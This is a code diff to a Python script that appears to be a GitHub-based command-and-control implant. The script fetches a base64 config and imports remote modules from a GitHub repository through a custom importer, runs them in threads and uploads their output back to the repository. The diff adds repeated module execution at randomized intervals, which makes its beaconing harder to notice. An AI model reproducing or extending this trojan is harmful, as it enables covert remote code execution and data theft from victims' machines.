@@ -2,10 +2,10 @@ import json, base64, sys, time, imp, random, threading, Queue, os
 
 from github3 import login
 
-program_id = 't1'
+para_id = 't1'
 
-program_config = 'config/%s.json' % program_id
-data_path = 'data/%s/' % program_id
+para_config = 'config/%s.json' % para_id
+data_path = 'data/%s/' % para_id
 modules = []
 configured = False #?
 task_queue = Queue.Queue()
@@ -29,7 +29,7 @@ def get_file_contents(filepath):
 
 def get_config():
 	global configured
-	config_json = get_file_contents(program_config)
+	config_json = get_file_contents(para_config)
 	#print config_json
 	config = json.loads(base64.b64decode(config_json))
 	configured = True
@@ -40,10 +40,10 @@ def get_config():
 
 	return config
 
-def store_module_result(data):
+def store_module_result(data, path=None):
+	if not path: path = 'data/%s/%d.data' % (para_id, random.randint(1000,100000))
 	gh, repo, branch = connect_to_github()
-	remote_path = 'data/%s/%d.data' % (program_id, random.randint(1000,100000))
-	repo.create_file(remote_path, 'added data', base64.b64encode(data))
+	repo.create_file(path, 'added data', data)
 	return
 
 class GitImporter(object):
@@ -70,21 +70,34 @@ class GitImporter(object):
 
 def module_runner(module):
 	task_queue.put(1)
-	result = sys.modules[module].run()
-
+	result, path = sys.modules[module].run()
 	task_queue.get()
 
-	# store the result in our repo
-	store_module_result(result)
+	store_module_result(result, path)
 	return
+
+def loop_module_runner(module, lapse, stop_event):
+	if int(lapse) <= 0: 
+		module_runner(module)
+	else:
+		while not stop_event.is_set():
+			module_runner(module)
+			randomized_lapse = random.randint(int(lapse), int(lapse) + int(int(lapse)*0.2))
+			stop_event.wait(randomized_lapse) # Similar to sleep but breaks on stop event set
+
 
 # Main loop
 sys.meta_path = [GitImporter()] # Here we assign our importer
+
+launched_modules = {}
+
 while 1:
-	if task_queue.empty():
-		config = get_config()
+	config = get_config()
 		for task in config:
-			thread = threading.Thread(target=module_runner, args=(task['module'],))
-			thread.start()
-			time.sleep(random.randint(1, 10))
-	time.sleep(random.randint(1000, 10000))
+			if task['module'] not in launched_modules.keys():
+				stop_event = threading.Event()
+				thread = threading.Thread(target=loop_module_runner, args=(task['module'], task.get('lapse', '0'), stop_event))
+				launched_modules[task['module']] = {'thread' : thread, 'stop_event' : stop_event}
+				launched_modules[task['module']]['thread'].start()
+	
+	time.sleep(random.randint(60, 120)) # every 1-2 mins config file is scanned for new modules
